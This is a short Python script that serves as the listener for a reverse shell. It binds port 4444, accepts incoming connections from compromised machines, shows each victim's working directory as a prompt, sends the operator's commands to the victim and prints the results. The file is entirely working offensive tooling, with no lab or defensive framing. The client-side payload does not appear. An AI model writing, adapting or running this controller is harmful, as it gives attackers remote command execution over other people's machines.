# _Modules:
from socket import *

# _Creating the listener
class ReverseTcpConnection(object):
    def __init__(self, host, port):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(1)

        # _Lists:
        self.clients = []

    # _Call function, accepting clients, sending & receiving data:
    def __call__(self, *args, **kwargs):

        # _Accepting clients:
        print("_______________________________________________________________\n[+] Wating for connection")
        while True:
            client, addr = self.server.accept()
            self.clients.append([client, addr])
            print(f"[+] Successful connection from {addr[0]} and port {addr[1]}"
                  "\n_______________________________________________________________\n")
            
            # _If statement to check for client:
            # _If there is a client, the script will continue.
            if self.clients:
                
                # _Infinite loop for sending & receiving data:
                while True:
                    pwd = client.recv(1024).decode()
                    # pwd = pwd + '>>> '
                    exc = input(pwd)

                    client.sendall(exc.encode())
                    data = client.recv(2048).decode()
                    
                    # _If the command doesn't exists, "Bad Command" will be printed
                    if data == '\n[-] Bad command!\n':
                        print(data)
                        continue

                    else:
                        print('\n',data,'\n')


# _Class call
start = ReverseTcpConnection("", 4444)
start()

